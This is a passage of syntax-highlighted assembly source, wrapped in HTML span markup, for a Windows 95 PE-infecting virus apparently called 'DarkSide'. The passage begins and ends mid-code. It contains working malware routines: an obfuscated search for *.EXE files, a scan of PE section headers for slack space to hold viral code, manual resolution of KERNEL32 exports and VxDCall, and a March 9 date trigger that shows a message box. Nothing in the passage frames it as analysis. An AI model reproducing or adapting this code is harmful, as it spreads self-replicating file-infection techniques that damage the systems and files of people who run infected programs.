                                                </span><span class="sc1">;structure</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Create</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FleHdle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save the handle</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;try to find the file usning FindFile and FindNext</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">GetFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;the find data area</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;push the location of</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">                          </span><span class="sc1">;exe file mask</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotexe</span><span class="sc0">                          </span><span class="sc1">;this should never get run</span><span class="sc0">
                                                </span><span class="sc1">;again but ya never know</span><span class="sc0">
</span><span class="sc1">;below is a nice way to waste time and it also puts *.EXE0 into the</span><span class="sc0">
</span><span class="sc1">;correct location in out data block</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;after the cmpbs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">o1</span><span class="sc0">
</span><span class="sc5">o1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">o1</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetFile</span><span class="sc0">  
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;exe file mask</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5784a89dh</span><span class="sc0">                   </span><span class="sc1">;now make the bytes at</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;at o1 =  to '*.EXE'0        </span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0e84fffbbh</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">gotexe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">FFirst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SrchHdle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GotOneF</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">;no file found set eax to 0 </span><span class="sc0">

</span><span class="sc5">GotOneF</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetNextF</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Counter</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; check how many we did</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;the find data area</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SrchHdle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">FNext</span><span class="sc4">]</span><span class="sc0">
         
        </span><span class="sc1">;if returns with 0 then no more files</span><span class="sc0">
        </span><span class="sc1">;other wise it found one</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GotOneF</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CheckDate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;for the hell of it use int 21 to do this</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00002a00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">   </span><span class="sc1">;march</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CDRET</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">09</span><span class="sc0">   </span><span class="sc1">;ninth</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CDRET</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc5">CDRET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">INT_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">002a0010h</span><span class="sc0">
            
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc4">]</span><span class="sc0">
 
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;vxd0            dd      0bff713d4h     ;this is the addresss for the</span><span class="sc0">
                                        </span><span class="sc1">;vxdcall0 </span><span class="sc0">
</span><span class="sc1">;get_21          dd      002a0010h      ;this is the 2a = Vwin32 10 = the int21</span><span class="sc0">
                                        </span><span class="sc1">;routine</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc5">NameD</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'         DarkSide'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Warning</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'     Nothing Going to '</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Save you From a Love'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"             that's Blind"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
 
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'               Slip to the'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'               DarkSide'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'   and Cross that Line'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'       March 9, 1986'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">MessShow</span><span class="sc4">:</span><span class="sc0">
                    
         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1024h</span><span class="sc0">       </span><span class="sc1">;gives me a question mark</span><span class="sc0">
                                </span><span class="sc1">;2 yes/no buttons</span><span class="sc0">
                                </span><span class="sc1">;and in front</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameD</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Warning</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameD</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessBox</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc1">;note that eax will equal 6 for yes,  7 for no</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; onreturn will have</span><span class="sc0">
</span><span class="sc1">; ESI = the start of a 4k area of r\w data that the virus can use</span><span class="sc0">
</span><span class="sc1">; eax = the data location to use</span><span class="sc0">

</span><span class="sc5">GetDataSpace</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004550H</span><span class="sc0">       </span><span class="sc1">;check for PE00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NotWin95A</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; ok we are at header + 4</span><span class="sc0">
                                        </span><span class="sc1">; now we are at 6</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; ax = the number of sections</span><span class="sc0">
                                        </span><span class="sc1">;peheader + 8</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get the number of sections</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">;get to the section header         </span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc1">;esi points to the first section header</span><span class="sc0">

</span><span class="sc5">TryNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NotWin95A</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c0000000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c0000000h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">NextOne1</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;virtual size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4095</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;size of raw data</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">OkSpace</span><span class="sc0">


</span><span class="sc5">NextOne1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">TryNext</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NotWin95A</span><span class="sc0">

</span><span class="sc5">OkSpace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;virtual address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;size of raw data     </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00400000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NotWin95A</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
 
         
 </span><span class="sc1">;end of GetDataSpace</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;returns with the VxDcall fill with the correct location</span><span class="sc0">
</span><span class="sc1">;or again esi = 0 if failed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">GetAddress</span><span class="sc4">:</span><span class="sc0">
         
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3CH</span><span class="sc0">       </span><span class="sc1">;points to the New Header         </span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">

      </span><span class="sc1">;ESI = THE PE HEADER START of the Kernel32</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">00004550H</span><span class="sc0">       </span><span class="sc1">;check for PE00</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">NoERROR</span><span class="sc0">

</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">NotWin95A</span><span class="sc0">  

</span><span class="sc1">;ESI SHOULD HOLD THE POINTER TO THE</span><span class="sc0">
</span><span class="sc1">;RVA TO THE EXPORT DIRECTORY </span><span class="sc0">

</span><span class="sc5">NoERROR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78H</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 78H = THE EXPORT RVA</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">Export</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">                </span><span class="sc1">; </span><span class="sc0">
           
        </span><span class="sc6">LODSD</span><span class="sc0">                           </span><span class="sc1">;  </span><span class="sc0">
         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">baseF</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;base of the functions </span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;Number of Functions</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;Number of Names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                 </span><span class="sc1">;this is to not go past the </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">limit</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;end of the search routine</span><span class="sc0">


        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;Address of Functions</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;Address of Names</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddOrd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddFunc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; get the first routine which is</span><span class="sc0">
                                        </span><span class="sc1">; the VxDCall</span><span class="sc0">
         
</span><span class="sc1">;ok we ha ve everthing we need to go ahead and locate the address's of the</span><span class="sc0">
</span><span class="sc1">;KERNEL32.dll functions</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetPr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0"> </span><span class="sc1">;gets the Routine we</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;are looking for        </span><span class="sc0">


</span><span class="sc5">LookLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AddName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get the first rva pointer to a name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Nindex</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">;index into the name array</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;now make it a true pointer to the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                 </span><span class="sc1">;name by adding the offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;sets the     counter to 0</span><span class="sc0">
 

</span><span class="sc5">TryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;what function we are looking for</span><span class="sc0">
                                        </span><span class="sc1">;now simple cmp strs</span><span class="sc0">
</span><span class="sc5">MatchByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">NextOne</span><span class="sc0">                </span><span class="sc1">;not it try next nameof fucntion</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;if equal to 0 we found a match</span><span class="sc0">
